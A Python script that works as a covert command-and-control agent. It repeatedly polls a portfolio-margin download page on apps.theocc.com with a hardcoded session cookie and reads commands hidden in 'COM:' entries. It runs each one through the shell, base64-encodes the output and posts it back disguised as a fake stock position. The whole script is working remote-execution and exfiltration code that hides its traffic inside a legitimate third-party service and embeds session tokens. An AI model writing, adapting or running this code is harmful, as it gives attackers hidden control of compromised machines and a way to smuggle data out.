import http.client
import re
import time
import subprocess
import base64
from urllib.parse import urlparse, urlunparse, urlencode  #
import urllib.parse


pub = "58EE37DB41C77C7ED5692C175C3BAC2D.pmcpublic-prod-ppube62l"

def make_get_request(url, headers):
    # Parse the provided URL
    parsed_url = urlparse(url)
    # Setup the connection
    conn = http.client.HTTPSConnection(parsed_url.netloc)
    # Construct the request path with query parameters
    request_path = urlunparse(('', '', parsed_url.path, '', parsed_url.query, ''))
    # Send the GET request with specified headers
    conn.request("GET", request_path, headers=headers)
    # Get the response
    response = conn.getresponse()
    data = response.read().decode("utf-8")
    conn.close()
    return data

def find_com_entries(data):
    # Find all entries starting with "COM:"
    return re.findall(r"\bCOM:[^\s]*", data)

# URL for the GET requests
url = "https://apps.theocc.com/pmc/pmcdDownloadSelectedPositionsTxt.do?_tk=1meX1bsa6JtN5gooGl0PJ_9ueIuRVa283saxc1yCtE0"

# Headers for the GET request
get_headers = {
    'Host': 'apps.theocc.com',
    'Cookie': pub,
    'Connection': 'close',
}


def second(xyz):
    params = urllib.parse.urlencode({
        'businessDate': '03/22/2024',
        'refresh': 'false',
        'clearingFirm': '',
        'accountID': xyz,
        'accountType': 'F',
        'symbol': 'notreal',
        'usdprice': '1.00',
        'quantity': '1',
        'basketID': '',
        'classGroup': '',
        'productGroup': ''
    })
    post_headers = {
        'Cookie': pub,
        'User-Agent': 'Mozilla/5.0 (X11; Linux aarch64; rv:109.0) Gecko/20100101 Firefox/115.0',
        'Accept': '*/*',
        'Accept-Language': 'en-US,en;q=0.5',
        'Accept-Encoding': 'gzip, deflate, br',
        'X-Requested-With': 'XMLHttpRequest',
        'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
        'X-Ts-Ajax-Request': 'true',
        'Origin': 'https://apps.theocc.com',
        'Referer': 'https://apps.theocc.com/pmc/pmc.do',
        'Sec-Fetch-Dest': 'empty',
        'Sec-Fetch-Mode': 'cors',
        'Sec-Fetch-Site': 'same-origin',
        'Te': 'trailers',
        'Connection': 'close',
        'Content-Length': str(len(params))
    }

    conn1 = http.client.HTTPSConnection("apps.theocc.com")
    # Send the POST request
    conn1.request("POST", "/pmc/pmcdAddStockPosition.json", params, post_headers)

    # Get the response for the POST request
    post_response = conn1.getresponse()
    post_data = post_response.read()
    print(post_data.decode("utf-8"))







# Make the first GET request and find "COM:" entries
initial_data = make_get_request(url, get_headers)
initial_matches = set(find_com_entries(initial_data))
print("Initial COM: entries:", initial_matches)
while True:
    time.sleep(5)  # Delay for the next request
    updated_data = make_get_request(url, get_headers)
    updated_matches = set(find_com_entries(updated_data))
    # print("Updated COM: entries:", updated_matches)

    # Identify new "COM:" entries by comparing initial and updated matches
    new_entries = updated_matches - initial_matches
    print("New COM: entries found in the update:", new_entries)

    for entry in new_entries:
        # Ensure entry is converted to string if it's not already one
        entry_str = str(entry)
        first = entry_str.split('000000', 1)
        cmd = first[0].split(':', 1)
        x = (cmd[1])
        modified_string = x.replace("_", " ") 
        process = subprocess.run(modified_string, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
        out = process.stdout
        #print(out)
        encoded_bytes = base64.b64encode(str(out).encode())
        encoded_string = encoded_bytes.decode('utf-8')
        print(encoded_string)
        second(encoded_string)

    # Update initial_matches for the next iteration to detect new changes
    initial_matches = updated_matches


